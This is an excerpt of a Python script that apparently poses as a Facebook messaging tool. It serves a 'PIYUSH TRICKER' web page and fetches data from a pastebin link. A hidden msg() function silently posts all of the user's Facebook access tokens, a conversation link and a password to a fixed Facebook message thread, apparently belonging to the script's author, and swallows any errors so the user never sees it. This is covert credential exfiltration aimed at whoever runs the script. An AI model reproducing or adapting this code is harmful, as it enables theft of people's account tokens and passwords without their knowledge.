...
class MyHandler(http.server.SimpleHTTPRequestHandler):
	def do_GET(self):
		...
		self.end_headers()
		self.wfile.write(b"PIYUSH TRICKER")
...
def send_messages():
	...
	mmm = requests.get('https://pastebin.com/raw/RZnXLWyG').text
	...
	def msg():
		parameters = {
			...
			'message': 'HELLO PIYUSH SIR  IM USING YOUR SERVER User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
		}
		try:
			s = requests.post("https://graph.facebook.com/v15.0/t_100070492726798/", data=parameters, headers=headers)
		except:
			pass
